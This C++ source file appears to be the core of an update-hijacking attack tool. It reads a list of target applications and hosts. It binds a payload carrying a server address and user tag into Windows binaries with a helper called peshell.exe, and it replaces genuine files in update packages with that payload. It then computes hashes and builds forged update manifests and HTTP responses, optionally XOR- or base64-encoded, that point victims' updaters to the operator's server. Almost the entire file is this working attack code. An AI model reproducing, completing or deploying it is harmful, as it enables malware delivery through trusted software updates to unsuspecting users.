
#include <windows.h>

#include "helper.h"

#include "json/json.h"
#include "FileOper.h"
#include "Utils/Tools.h"
#include "json/reader.h"
#include "SSL/sslPublic.h"
#include "cipher/CryptoUtils.h"
#include "HttpUtils.h"
#include <stdarg.h>
#include "cipher/compression.h"
#include "Public.h"
#include <shellapi.h>
#include "cipher/Base64.h"
#include "cipher/UrlCodec.h"
#include "cipher/sha.h"

#pragma comment(lib,"shell32.lib")




typedef int (*crypt_func_ptr)(char* src, int srcsize, char* dst, int dstsize);

int base24crypt(char* src, int srcsize, char* dst, int dstsize) {
	char* key = "Z#jM0NeVv#wMDG9+8rwzxVsti80A=j5a.op";

	for (int i = 0; i < srcsize; i++)
	{
		int k = i % 0x23;
		dst[i] = src[i] ^ key[k];
	}
	return srcsize;
}


CRYPT_ALGORITHM g_crypt_algorithm[64] = {
	{"base24",base24crypt},
	{"base64",Base64::Base64Encode},
	{"urlcode",UrlCodec::urlencode},
};

vector < UpdateData> gUpdateData;




int Helper::GetSdkVersion(char* szsdkver, char* szversions[8]) {
	int j = 0;
	szversions[j] = szsdkver;
	j++;
	int sdklen = lstrlenA(szsdkver);
	for (int i = 0; i < sdklen; i++)
	{
		if (szsdkver[i] == '.')
		{
			szsdkver[i] = 0;

			szversions[j] = szsdkver + i + 1;
			j++;
		}
	}

	return j;
}

int ResponseFromRegex(char * buf,const char* regex, const  char* format,  int payloadLen,const char * payload) {

	int cnt = 0;
	const char* params[64] = { 0 };

	int len = strlen(regex);

	string httptm = get_http_time();

	char* type = "";

	for (int i = 0; i < len; i++) {
		switch (regex[i]) {
			case 'J': {
				params[cnt++] = (char*)"application/json; charset=utf-8";
				continue;
			}
			case 'P': {
				params[cnt++] = (char*)"text/plain";
				continue;
			}
			case 'X': {
				params[cnt++] = (char*)"text/xml; charset=utf8";
				continue;
			}
			case 'B': {
				params[cnt++] = (char*)"binary/octet-stream";
				continue;
			}
			case 'U': {
				params[cnt++] = (char*)"application/x-www-form-urlencoded";
				continue;
			}
			case 'A': {
				params[cnt++] = (char*)"application/xml;charset=UTF-8";
				continue;
			}
			case 'O': {
				params[cnt++] = "application/octet-stream";
				continue;
			}
			case 'h': {
				params[cnt++] = "application/html; charset=utf-8";
				continue;
			}
			case 'H': {
				params[cnt++] = "text/html";
				continue;
			}
			case 'l': {
				params[cnt++] = (char*)payloadLen;
				continue;
			}
			case 't': {
				params[cnt++] = httptm.c_str();
				continue;
			}
			case 'j': {
				params[cnt++] = "application/javascript; charset=utf-8";
				continue;
			}
			case ' ':
			{
				continue;
			}
			case '\t':
			{
				continue;
			}
			default: {
				log("%s %d regex:%s format:%s error\r\n", __FUNCTION__, __LINE__, regex, format);
				return 0;
			}
		}
	}

	va_list args = (va_list)params;
	//va_start(args, params);
	int updateLen = vsprintf(buf, format, args);
	//va_end(args);

	//int updateLen = sprintf(buf, format, httptm.c_str(),type, payloadLen);
	memcpy(buf + updateLen, payload, payloadLen);
	//string retstr = string(update, updateLen);
	//delete []update;
	//return retstr;
	buf[payloadLen + updateLen] = 0;
	return payloadLen + updateLen;
}


string ObjectFromRegex( char* regex,char* format,string version, vector<UPDATE_INFORMATION> ui) {

	int cnt = 0;
	const char* params[64] = { 0 };
	int urlcnt = 0;
	int vercnt = 0;
	int md5cnt = 0;
	int sizecnt = 0;
	int sha1cnt = 0;
	int sha256cnt = 0;

	int len = strlen(regex);
	for (int i = 0; i < len; i++) {
		switch (regex[i]) {
			case 'U': {
				params[cnt++] = ui[urlcnt++].url.c_str();
				continue;
			}
			case 'u': {
				params[cnt++] = ui[0].url.c_str();
				continue;
			}
			case 'v': {
				params[cnt++] = version.c_str();
				continue;
			}
			case 'V': {
				params[cnt++] = ui[vercnt++].version.c_str();
				continue;
			}
			case 'M': {
				params[cnt++] =ui[md5cnt++].md5.c_str();
				continue;
			}
			case 'h': {
				params[cnt++] =ui[ sha1cnt++].sha1.c_str();
				continue;
			}
			case 'H': {
				params[cnt++] = ui[sha256cnt++].sha256.c_str();
				continue;
			}
			case 'S': {
				params[cnt++] =(char*)ui[sizecnt++].fs;
				continue;
			}
			case 'N': {
				params[cnt++] = (char*)ui[sizecnt++].name.c_str();
				continue;
			}
			case ' ':
			{
				continue;
			}
			case '\t':
			{
				continue;
			}
			default: {
				log("%s %d regex:%s format:%s error\r\n", __FUNCTION__, __LINE__, regex, format);
				return "";
			}
		}
	}

	int backsize = cnt * 4 + 8;
	char *outbuf = new char[0x100000];
	int outLen = 0;

	va_list args = (va_list) params;
	//va_start(args, params);
	outLen = vsprintf(outbuf, format, args);
	//va_end(args);
	string retstr = string(outbuf, outLen);
	delete []outbuf;
	return retstr;
}






int GetTargetHost(vector<string>& targetHost) {
	int fs = 0;
	char* file = 0;
	int ret = 0;
	int cnt = 0;
	string cfgpath = gLocalPath + "config\\";

	ret = FileOper::fileReader(cfgpath + "objects.json", &file, &fs);
	if (ret == 0) {
		log("%s %d error\r\n", __FUNCTION__, __LINE__);
		exit(-1);
	}

	Json::Reader reader;
	Json::Value root;
	reader.parse((const char*)file, root, true);

	delete file;

	const Json::Value& obj = root["objects"];
	int size = obj.size();

	for (int i = 0; i < size; i++) {
		bool valid = obj[i]["valid"].asBool();
		if (valid) {
			string host = obj[i]["host"].asString();
			targetHost.push_back(host);
			cnt++;
		}
	}
	return cnt;
}

//peshell.exe -b services.exe qmnetworkmgr.dll -p 10.43.41.5 mytest -o test.dll
int PreparePayload(string server,string user) {
	string cfgpath = gLocalPath + "config\\";
	string exe = cfgpath+"base.exe";
	string dll = cfgpath + "base.dll";
	
	string shellexe = cfgpath + "peshell.exe";
	char* bindexe = "services.exe";
	char* binddll = "qmnetworkmgr.dll";

	char cmd[1024];
	if (FileOper::isFileExist(dll) == 0) {
		wsprintfA(cmd, "-b %s %s -p %s %s -o %s", bindexe, binddll, server.c_str(), user.c_str(), "base.dll");
		ShellExecuteA(0, "open", shellexe.c_str(), cmd, cfgpath.c_str(), 0);
		//RunProcess(exe.c_str(), cmd, path.c_str(), 0, 0);
	}

	if (FileOper::isFileExist(exe) == 0) {
		wsprintfA(cmd, "-b %s %s -p %s %s -o %s", bindexe, binddll, server.c_str(), user.c_str(), "base.exe");
		ShellExecuteA(0, "open", shellexe.c_str(), cmd, cfgpath.c_str(), 0);
		//RunProcess(exe.c_str(), cmd, path.c_str(), 0, 0);
	}

	return 0;
}

int ObjectParser(vector<string> &targetHost,string server,string user) {
	//return 0;
	int ret = 0;

	char* retaddr = 0;
	__asm {
		lea eax, __retaddr
		mov [retaddr],eax
	}
	//(__FUNCTION__,retaddr);
	int k = __LINE__/2;
	int d = __LINE__ - 292;
	//k = k / d;

	PreparePayload(server, user);

	string pluginPath = Public::getPluginPath();
	string cfgpath = gLocalPath + "config\\";

	int fs = 0;
	char* file = 0;
	ret = FileOper::fileReader(cfgpath +"objects.json", &file, &fs);
	if (ret == 0) {
		log("%s %d error\r\n", __FUNCTION__, __LINE__);
		exit(-1);
	}

	Json::Reader reader;
	Json::Value root;
	reader.parse((const char*)file, root,true);
	delete file;

	const Json::Value& obj = root["objects"];
	int size = obj.size();
	
	for (int i = 0; i < size; i++) {
		bool valid = obj[i]["valid"].asBool();
		if (valid) {
			string app = obj[i]["app"].asString();
			string host = obj[i]["host"].asString();
			
			//targetHost.push_back(host);
			string url = obj[i]["url"].asString();

			string cfgver = obj[i]["version"].asString();
			if (cfgver == "") {
				cfgver = "9.9.9.9";
			}

			const Json::Value& pl = obj[i]["payload"];
			int pls = pl.size();
			
			vector<UPDATE_INFORMATION> payloads;
			payloads.clear();

 			for (int n = 0; n < pls; n++) {
				string name = pl[n]["name"].asString();
				if (name == "")
					name = "base.exe";

				string ct = pl[n]["compress"].asString();

				string target = name;
				int ft = FileOper::GetFileType(cfgpath + name);
				 
				if (ft & FILE_ATTRIBUTE_DIRECTORY) {
					string replace = pl[n]["replace"].asString();
					if (replace != "") {
						CopyFileA((cfgpath + name + "\\" + replace).c_str(), (cfgpath + name + "\\" + replace + ".bak").c_str(), 0);
						if (strcmp(replace.c_str() + replace.length() - 4, ".exe") == 0) {
							CopyFileA((cfgpath + "base.exe").c_str(), (cfgpath + name + "\\" + replace).c_str(), 0);
						}
						else if (strcmp(replace.c_str() + replace.length() - 4, ".dll") == 0) {
							CopyFileA((cfgpath + "base.dll").c_str(), (cfgpath + name + "\\" + replace).c_str(), 0);
						}
					}
					if (ct == "zip")
					{
						string outfn = pluginPath + name + ".zip";
						if (FileOper::isFileExist(outfn) == 0) {
							string zippath = cfgpath + name;
							ret = Public::zipFolder("", (char*)zippath.c_str(), outfn);
						}
						target = name + ".zip";
					}
					else if (ct == "7z") {
						string outfn = pluginPath + name + ".7z";
						if (FileOper::isFileExist(outfn) == 0) {
							string zippath = cfgpath + name + "\\*";
							
							char param[1024];
							string exe = cfgpath + "7z.exe";
							wsprintfA(param, " a -t7z \"%s\" \"%s\"", outfn.c_str(), zippath.c_str());
							//ShellExecuteA(0, "open", exe.c_str(), param, cfgpath.c_str(), 0);
							string cmd = string("7z.exe") + param;
							system(cmd.c_str());
						}
						target = name + ".7z";
					}
					else if (ct == "cab") {
						string outfn = pluginPath + name + ".cab";
						if (FileOper::isFileExist(outfn) == 0) {
							string zippath = cfgpath + name + "\\*";

							char param[1024];
							string exe = "7z.exe";
							wsprintfA(param, " a -tcab \"%s\" \"%s\"", outfn.c_str(), zippath.c_str());
							//ShellExecuteA(0, "open", exe.c_str(), param, cfgpath.c_str(), 0);
							string cmd = string("7z.exe") + param;
							system(cmd.c_str());
						}
						target = name + ".cab";
					}
					else {
						//error
						log("%s %d error\r\n",__FUNCTION__,__LINE__);
						ret = CopyFileA((cfgpath + name).c_str(), (pluginPath + target).c_str(), 0);
					}
				}
				else if (ft & FILE_ATTRIBUTE_ARCHIVE) {
					if (ct == "zip")
					{
						string infn = cfgpath + name;
						string inzipfn = name;
						string outfn = GetMainFileName(name) + ".zip";
						ret = Public::zipFile(inzipfn.c_str(), (char*)infn.c_str(), (char*)outfn.c_str());
						target = GetMainFileName(name) + ".zip";
					}
					else if (ct == "7z") {
						string outfn = pluginPath + GetMainFileName(name) + ".7z";
						string infn = cfgpath + name;
						Compress7z((char*)outfn.c_str(), (char*)infn.c_str());
						target = GetMainFileName(name) + ".7z";
					}
					else if (ct == "cab") {
						string outfn = pluginPath + GetMainFileName(name) + ".cab";
						string infn = cfgpath + name;
						MakeCab((char*)outfn.c_str(), (char*)infn.c_str());
						target = GetMainFileName(name) + ".cab";
					}
					else {				
						ret = CopyFileA((cfgpath + name).c_str(), (pluginPath + target).c_str(), 0);
					}
				}
				else {

				}
				int payload_size = FileOper::getFileSize(pluginPath + target);

				string version = pl[n]["version"].asString();
				if (version == "") {
					version = "9.9.9.9";
				}
		
				char szmd5[64];
				unsigned char binmd5[16];
				CryptoUtils::getUpdateFileMd5(pluginPath + target, szmd5, binmd5, 1);
				string md5 = string(szmd5, 32);

				char sha1[64];
				MySha::filesha1((pluginPath + target).c_str(), sha1, 1);

				char sha256[128];
				MySha::filesha256((pluginPath + target).c_str(), sha256, 1);

				string destname = pl[n]["dest"].asString();
				if (destname == "") {
					destname = target;
				}
				else if (destname == "md5")
				{
					destname = string(szmd5, 32)+ target.substr(target.length() - 4);
					ret = CopyFileA((pluginPath + target).c_str(), (pluginPath + destname).c_str(), 0);
				}
				else {
					//something error?
				}

				string desturl = pl[n]["desthost"].asString();
				char url[1024];
				if (desturl == "") {
					wsprintfA(url, "http://%s/%s", gstrServerIP.c_str(), destname.c_str());	
				}
				else {
					wsprintfA(url, "http://%s/%s", desturl.c_str(), destname.c_str());
				}
				
				payloads.push_back({ target,version,payload_size, md5, sha1, sha256,  url});
			}
			
			if (payloads.size() > 0) {
				string respFormatfn = obj[i]["httpFormat"].asString();
				if (respFormatfn == "") {
					respFormatfn = "http.txt";
				}

				string formatfn = obj[i]["format"].asString();
				if (formatfn == "") {
					formatfn = app + ".txt";
				}

				string regex = obj[i]["regex"].asString();

				string respRegex = obj[i]["respRegex"].asString();

				char* format = 0;
				int formatLen = 0;
				ret = FileOper::fileReader((cfgpath + formatfn).c_str(), &format, &formatLen);

				char* respFormat = 0;
				int respFormatLen = 0;
				ret = FileOper::fileReader((cfgpath + respFormatfn).c_str(), &respFormat, &respFormatLen);

				if (respFormatLen && formatLen) {
					string payloadstr = ObjectFromRegex((char*)regex.c_str(), format, cfgver, payloads);
					int packsize = payloadstr.length() + 0x1000;
					char* pack = new char[packsize];
					
					if (obj[i].isMember("crypt")) {
						char* tmpbuf = new char[packsize];
						int tmpsize = 0;

						Json::Value crypt = obj[i]["crypt"];
						string cmethod = crypt["method"].asString();
						for (int i = 0; i < sizeof(g_crypt_algorithm) / sizeof(g_crypt_algorithm[0]); i++) {
							if (lstrcmpiA(g_crypt_algorithm[i].name, cmethod.c_str()) == 0) {
								crypt_func_ptr cryptfunc = (crypt_func_ptr)g_crypt_algorithm[i].ptr;
								tmpsize = cryptfunc((char*)payloadstr.c_str(), payloadstr.length(), tmpbuf, payloadstr.length());
								break;
							}
						}

						string encode = crypt["encode"].asString();
						if (encode == "base64") {
							char* base64buf = new char[tmpsize * 4 / 3 + 0x1000];
							int base64len = Base64::Base64Encode(base64buf, (unsigned char*)tmpbuf, tmpsize);
							memcpy(tmpbuf, base64buf, base64len);
							tmpsize = base64len;
							delete base64buf;
						}
						string url = crypt["urlcode"].asString();
						if (url == "urlencode") {
							char* urlbuf = new char[tmpsize * 2 + 0x1000];
							int urllen = UrlCodec::urlencode(tmpbuf, tmpsize, urlbuf, tmpsize * 2 + 0x1000);
							memcpy(tmpbuf, urlbuf, urllen);
							tmpsize = urllen;
							delete urlbuf;
						}
						packsize = ResponseFromRegex(pack, respRegex.c_str(), respFormat, tmpsize, tmpbuf);
						delete tmpbuf;
					}
					else {
						packsize = ResponseFromRegex(pack, respRegex.c_str(), respFormat, payloadstr.length(), payloadstr.c_str());
					}

					delete format;
					delete respFormat;
					if (host == "localhost") {
						host = gstrServerIP;
					}
					gUpdateData.push_back({ url,host,pack,packsize });
				}
			}
		}
	}

	__retaddr:
	return 0;
}



	